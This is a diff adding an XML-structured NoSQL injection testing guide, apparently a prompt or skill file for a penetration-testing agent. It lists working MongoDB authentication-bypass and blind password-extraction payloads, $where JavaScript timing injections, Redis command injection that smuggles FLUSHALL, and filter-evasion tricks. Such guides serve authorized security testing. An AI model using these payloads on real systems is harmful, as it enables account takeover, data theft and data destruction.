@@ -1,0 +1,251 @@
+<nosql_injection_guide>
+<title>NOSQL INJECTION</title>
+
+<critical>NoSQL injection exploits the lack of parameterization in NoSQL databases, allowing attackers to manipulate queries, bypass authentication, and extract data. Unlike SQL injection, NoSQL injection often leverages operator injection, JSON manipulation, and JavaScript execution contexts.</critical>
+
+<scope>
+- Document databases: MongoDB, CouchDB, Firebase Firestore
+- Key-value stores: Redis, DynamoDB
+- Wide-column stores: Cassandra, HBase
+- Graph databases: Neo4j, ArangoDB
+- Query languages: MongoDB query operators, Redis commands, Cypher (Neo4j)
+</scope>
+
+<methodology>
+1. Identify injection points: query parameters, JSON bodies, headers, and cookies that interact with NoSQL databases.
+2. Determine the database type through error messages, response patterns, or technology fingerprinting.
+3. Test operator injection by submitting JSON objects with query operators instead of scalar values.
+4. Confirm injection via authentication bypass, data extraction, or observable side effects (timing, errors).
+5. Escalate to JavaScript execution contexts where available (MongoDB $where, $function).
+</methodology>
+
+<injection_surfaces>
+- Login forms: username/password fields accepting JSON or objects
+- Search/filter endpoints: query parameters converted to database queries
+- API endpoints: JSON body fields mapped directly to query documents
+- GraphQL resolvers: arguments passed unsanitized to database queries
+- URL parameters: parsed as objects via query string parsers (qs, querystring)
+</injection_surfaces>
+
+<mongodb_techniques>
+<operator_injection>
+- Basic operators: $gt, $gte, $lt, $lte, $ne, $in, $nin
+- Regex operators: $regex, $options for pattern matching
+- Logical operators: $or, $and, $nor, $not
+- Element operators: $exists, $type
+- Evaluation operators: $where, $expr, $jsonSchema
+
+Example authentication bypass:
+{% raw %}
+# Original expected input
+{"username": "admin", "password": "secret"}
+
+# Injected payload - $ne operator
+{"username": "admin", "password": {"$ne": ""}}
+
+# Injected payload - $gt operator  
+{"username": "admin", "password": {"$gt": ""}}
+
+# Injected payload - $regex
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+
+# URL-encoded for GET requests
+username=admin&password[$ne]=
+username[$regex]=^admin&password[$gt]=
+{% endraw %}
+</operator_injection>
+
+<javascript_injection>
+- $where clause: executes JavaScript on each document
+- $function: server-side JavaScript (MongoDB 4.4+)
+- mapReduce: JavaScript map/reduce functions
+
+{% raw %}
+# Time-based blind injection via $where
+{"username": "admin", "$where": "sleep(5000)"}
+{"$where": "this.username == 'admin' && sleep(5000)"}
+
+# Data extraction via $where
+{"$where": "this.password.match(/^a/) && sleep(5000)"}
+
+# Boolean-based extraction
+{"$where": "this.password[0] == 'a'"}
+{% endraw %}
+</javascript_injection>
+
+<aggregation_injection>
+- Pipeline stages: $match, $project, $group, $lookup
+- Injection into $lookup for cross-collection access
+- Expression injection in $project
+
+{% raw %}
+# Injecting into aggregation pipeline
+{"$match": {"role": {"$ne": ""}}}
+{"$lookup": {"from": "users", "localField": "_id", "foreignField": "userId", "as": "userData"}}
+{% endraw %}
+</aggregation_injection>
+
+<blind_extraction>
+- Character-by-character extraction using $regex
+- Timing-based extraction with sleep() in $where
+- Boolean-based using $regex anchors
+
+{% raw %}
+# Regex-based password extraction
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+{"username": "admin", "password": {"$regex": "^abc"}}
+
+# Binary search with $gt/$lt
+{"username": "admin", "password": {"$gt": "m"}}
+{"username": "admin", "password": {"$gt": "s"}}
+{% endraw %}
+</blind_extraction>
+</mongodb_techniques>
+
+<couchdb_techniques>
+- View injection via map/reduce functions
+- Mango query operator injection
+- Design document manipulation
+
+{% raw %}
+# Mango query injection
+{"selector": {"username": "admin", "password": {"$ne": ""}}}
+
+# View function injection (if controllable)
+function(doc) { if(doc.username == 'admin') emit(doc._id, doc.password); }
+{% endraw %}
+</couchdb_techniques>
+
+<redis_techniques>
+- Command injection via unsanitized input
+- Lua script injection
+- Key pattern exploitation
+
+{% raw %}
+# Command injection patterns
+SET key "value\r\nFLUSHALL\r\n"
+GET key; KEYS *
+EVAL "return redis.call('keys','*')" 0
+
+# Lua script injection
+EVAL "return redis.call('get', KEYS[1])" 1 "admin:password"
+{% endraw %}
+</redis_techniques>
+
+<detection_methods>
+<error_based>
+- Submit malformed JSON/BSON to trigger parser errors
+- Use invalid operators to reveal database type
+- Observe error messages for query structure hints
+</error_based>
+
+<boolean_based>
+- Compare responses with always-true vs always-false conditions
+- Use $ne: "" vs $eq: "invalid" for baseline comparison
+- Monitor response length, content, and timing differences
+</boolean_based>
+
+<timing_based>
+- MongoDB: sleep() in $where clause
+- Regex complexity attacks: catastrophic backtracking
+- Heavy operations: $lookup on large collections
+</timing_based>
+
+<out_of_band>
+- MongoDB $where with external HTTP calls (limited)
+- DNS exfiltration via custom functions (rare)
+</out_of_band>
+</detection_methods>
+
+<bypass_techniques>
+<input_validation_bypass>
+- Unicode normalization: different representations of operators
+- Case variations: $NE, $Ne (if not properly normalized)
+- Nested objects: {"password": {"x": {"$ne": ""}}}
+- Array wrapping: {"password": [{"$ne": ""}]}
+</input_validation_bypass>
+
+<waf_bypass>
+- JSON key ordering variations
+- Whitespace and comment injection
+- Encoding: base64, hex, unicode escapes
+- Chunked transfer encoding
+- Content-type switching: application/json vs text/plain
+</waf_bypass>
+
+<framework_specific>
+- Express.js qs parser: ?password[$ne]=
+- PHP MongoDB: array parameters via []
+- Python: dict-based query construction vulnerabilities
+</framework_specific>
+</bypass_techniques>
+
+<common_payloads>
+{% raw %}
+# Authentication bypass - JSON body
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
+
+# Authentication bypass - URL parameters
+?username[$ne]=&password[$ne]=
+?username=admin&password[$gt]=
+?username[$regex]=.*&password[$ne]=
+
+# Data extraction - regex enumeration
+{"username": {"$regex": "^a"}}
+{"username": {"$regex": "^ad"}}
+{"username": {"$regex": "^adm"}}
+
+# Field discovery
+{"username": {"$exists": true}}
+{"password": {"$type": "string"}}
+
+# JavaScript execution (if $where enabled)
+{"$where": "1==1"}
+{"$where": "this.password.length > 5"}
+{"$where": "Object.keys(this).length > 0"}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Confirm injection by demonstrating authentication bypass or unauthorized data access.
+2. Show side-by-side comparison of legitimate vs injected requests with different responses.
+3. Extract verifiable data (username list, document count) to prove query manipulation.
+4. For blind injection, demonstrate consistent timing differences or boolean response changes.
+5. Document the exact payload and encoding required for successful exploitation.
+</validation>
+
+<false_positives>
+- Applications using parameterized queries or ODM with proper sanitization
+- Input validation that strips or escapes special characters
+- Type checking that rejects objects when strings are expected
+- Rate limiting or anomaly detection causing inconsistent responses
+- Responses that differ due to caching rather than query manipulation
+</false_positives>
+
+<impact>
+- Authentication bypass: login as any user without credentials
+- Data exfiltration: extract sensitive documents and fields
+- Authorization bypass: access resources of other users (BOLA/IDOR)
+- Denial of service: heavy queries or infinite loops in JavaScript
+- Remote code execution: via server-side JavaScript in rare configurations
+</impact>
+
+<pro_tips>
+1. Start with operator injection before attempting JavaScript; it's more common and reliable.
+2. Test both JSON body and URL parameter injection paths; frameworks handle them differently.
+3. Use $regex for blind extraction when timing attacks are unreliable.
+4. Check for type coercion issues: strings vs objects vs arrays.
+5. Enumerate fields using $exists before attempting extraction.
+6. Monitor for rate limiting that may affect timing-based tests.
+7. Test with and without Content-Type header; some parsers are lenient.
+8. Look for GraphQL endpoints that pass arguments directly to MongoDB.
+9. Check if $where is enabled; it's often disabled for security.
+10. Document the exact encoding and transport mechanism for reproducibility.
+</pro_tips>
+
+<remember>NoSQL injection succeeds where type checking fails. Always test scalar fields with object payloads containing operators, and verify that the application properly validates input types before query construction.</remember>
+</nosql_injection_guide>
